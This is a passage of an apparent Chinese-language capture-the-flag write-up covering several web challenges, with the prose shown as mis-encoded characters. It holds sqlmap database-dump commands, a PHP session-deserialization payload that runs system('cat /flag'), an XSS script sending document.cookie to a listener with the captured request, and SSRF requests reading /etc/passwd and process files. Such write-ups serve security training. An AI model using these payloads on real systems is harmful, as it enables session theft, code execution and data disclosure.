<p>è¿™é¢˜é‡Œé¢å…¶å®è¿˜æœ‰ fake flagï¼Œä½†æ˜¯æˆ‘è¿™é‡Œç•¥å»äº†ã€‚å¸Œæœ›èƒ½å¤Ÿè‡ªå·±æ‘¸ç´¢ä¸€ä¸‹ã€‚</p>
<p>æˆ–è€…å¯ä»¥ä½¿ç”¨ sqlmap ä¸€æŠŠæ¢­äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie <span class="s2">&#34;username=cnss&#34;</span> --level <span class="m">2</span> --dbs --hex
</span></span><span class="line"><span class="cl"> python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie <span class="s2">&#34;username=cnss&#34;</span> --level <span class="m">2</span> -D CN55 --tables --hex
</span></span><span class="line"><span class="cl"> python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie <span class="s2">&#34;username=cnss&#34;</span> --level <span class="m">2</span> -D CN55 -T fulage --dump --hex
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/run8.png"
        data-srcset="./img/run8.png, ./img/run8.png 1.5x, ./img/run8.png 2x"
        data-sizes="auto"
        alt="./img/run8.png"
        title="run8" /></p>
<h2 id="-to_be_admin_again">ğŸ¤ To_be_Admin_Again</h2>
<p>è¿˜æ˜¯ç›´æ¥å®¡æŸ¥æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// index.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CNSS</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">&#39;guest&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">===</span> <span class="s1">&#39;admin&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// save.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span><span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cnss&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;cnss&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cnss&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°å¯ç–‘ä»£ç <code>ini_set('session.serialize_handler','php_serialize');</code>ï¼ˆå¼€æœ</p>
<p>å‘ç°è¿™é‡Œå¯èƒ½å­˜åœ¨<strong>Sessionåºåˆ—åŒ–é€‰æ‹©å™¨æ¼æ´</strong>ï¼Œå¯ä»¥å®ç°ååºåˆ—åŒ–ä½¿ <code>$code</code> å¯æ§</p>
<p>è¿™é‡Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ <code>class CNSS</code> ä¸­ï¼Œ<code>$username,$code</code> çš„ç±»å‹éƒ½æ˜¯ <code>private</code>ã€‚ååºåˆ—åŒ–æ—¶éœ€è¦åœ¨å±æ€§åç§°å‰é¢åŠ ä¸Š<code>%00ç±»å%00</code>ã€‚è¿™é‡Œä¸ºäº†é¿å…ç›´æ¥åºåˆ—åŒ–<code>%00</code>æ˜¾ç¤ºä¹±ç çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å‡º<code>urlencode</code>åçš„<code>payload</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CNSS</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;system(&#34;ls /&#34;);&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CNSS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;|&#39;</span> <span class="o">.</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åä¿®æ”¹å±æ€§æ•°ä»¥ç»•è¿‡ <code>weakup</code>ï¼ˆååºåˆ—åŒ–æ¼æ´çš„åŸºæœ¬çŸ¥è¯†</p>
<p>å¾—åˆ°ï¼š</p>
<p><code>|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A15%3A%22system%28%22ls+%2F%22%29%3B%22%3B%7D</code></p>
<p>å‘ç° flag åœ¨æ ¹ç›®å½•ä¸‹ï¼Œä¿®æ”¹æ‰§è¡Œä»£ç ä¸º <code>cat /flag</code></p>
<p>æ‰€ä»¥æœ€ç»ˆæ­¥éª¤ä¸ºå…ˆè®¿é—®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://8.130.29.197:6008/save.php?cnss=|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å†è®¿é—®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://8.130.29.197:6008
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ° flag</p>
<h2 id="-to_be_admin_again_and_again">ğŸ˜° To_be_Admin_Again_and_Again</h2>
<p>æŸ¥çœ‹ html æºç å‘ç° Message æ–‡æœ¬æ¡†å¯ä»¥é€šè¿‡é—­åˆ <code>textarea</code> é€ æˆ <code>XSS</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">textarea</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;message&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;message&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;form-control input&#34;</span> <span class="na">rows</span><span class="o">=</span><span class="s">&#34;8&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">textarea</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨ Message æ–‡æœ¬æ¡†å†™å…¥å¦‚ä¸‹å†…å®¹ç‚¹å‡» Preview æŒ‰é’®ï¼Œå‘ç° JS ä»£ç è¢«æ‰§è¡Œäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ„é€ å¦‚ä¸‹ JS å°† <code>Cookie</code> å‘é€åˆ°æœåŠ¡å™¨è®°å½•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">img</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;http://10.0.0.1:7777/?cookie=&#39;</span> <span class="o">+</span> <span class="nx">cookie</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">img</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†™ä¸ªè„šæœ¬çˆ†ç ´ <code>SHA256</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">table</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">t</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="n">h</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="n">t</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">crack</span><span class="p">(</span><span class="s1">&#39;b62936&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æäº¤åå¯ä»¥æ‹¿åˆ° bot è®¿é—®çš„æ—¶å€™ä½¿ç”¨çš„ <code>Cookie</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@iZ2zeglb8irh5gnt1c6x7dZ ~]# nc -lvvp 7777
</span></span><span class="line"><span class="cl">Ncat: Version 7.50 ( https://nmap.org/ncat )
</span></span><span class="line"><span class="cl">Ncat: Listening on :::7777
</span></span><span class="line"><span class="cl">Ncat: Listening on 0.0.0.0:7777
</span></span><span class="line"><span class="cl">Ncat: Connection from 1.117.6.207.
</span></span><span class="line"><span class="cl">Ncat: Connection from 1.117.6.207:39600.
</span></span><span class="line"><span class="cl">GET /?cookie=session%3DeyJhZG1pbiI6dHJ1ZX0.YwzeZQ.AXZf3l60naksoRZHWyy0frUZFEI HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 101.200.202.216:7777
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.212 Safari/537.36
</span></span><span class="line"><span class="cl">Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
</span></span><span class="line"><span class="cl">Referer: http://127.0.0.1:5000/
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: en-US
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ›¿æ¢ <code>Cookie</code> è®¿é—® <code>/admin</code> æ‹¿åˆ° flag</p>
<h2 id="to_be_admin_again_and_again_and_again">ğŸ¤¯To_be_Admin_Again_and_Again_and_Again</h2>
<p>å°è¯•ä½¿ç”¨ <code>file åè®®</code> è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥è¯»å–ï¼Œä½†æ˜¯è¯»å–ä¸åˆ° <code>/flag</code>ï¼Œè€ƒè™‘ flag ä¸åœ¨è¿™ä¸ªæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://1.117.6.207:65006/request?url=file:///etc/passwd
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹ä¸‹æœåŠ¡ç«¯çš„è¿›ç¨‹æ˜¯é€šè¿‡ä»€ä¹ˆå‘½ä»¤å¯åŠ¨çš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://1.117.6.207:65006/request?url=file:///proc/self/cmdline
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python app.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°è¯•è¯»æºç ï¼Œ å¹¶æ²¡æœ‰å‘ç° flagï¼Œ è€ƒè™‘ flag åœ¨å†…ç½‘çš„å…¶ä»–ä¸»æœºä¸Š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://1.117.6.207:65006/request?url=file:///proc/self/cwd/app.py
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">SCHEME</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">,</span> <span class="s1">&#39;file&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/request&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">req</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">url</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">scheme</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">SCHEME</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;Invalid scheme&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Please enter a URL&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¯»å– <code>arp</code> è®°å½•ï¼Œå‘ç° <code>172.16.233.233</code> æœ‰ <code>MAC åœ°å€</code> ï¼ˆå¦ä¸€ä¸ªæ˜¯ç½‘å…³ï¼‰ï¼Œè€ƒè™‘åˆ° <code>Flask</code> é»˜è®¤ç«¯å£ä¸º 5000ï¼Œå°è¯•è®¿é—® <code>http://172.16.233.233:5000</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://1.117.6.207:65006/request?url=file:///proc/net/arp
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">IP address       HW type     Flags       HW address            Mask     Device
</span></span><span class="line"><span class="cl">172.16.233.245   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.236   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.219   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.225   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.5     0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.230   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.221   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.251   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.248   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.253   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.242   0x1         0x0         00:00:00:00:00:00     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.233   0x1         0x2         02:42:ac:10:e9:e9     *        eth0
</span></span><span class="line"><span class="cl">172.16.233.247   0x1         0x0         00:00:00:00:00:00     *        eth0
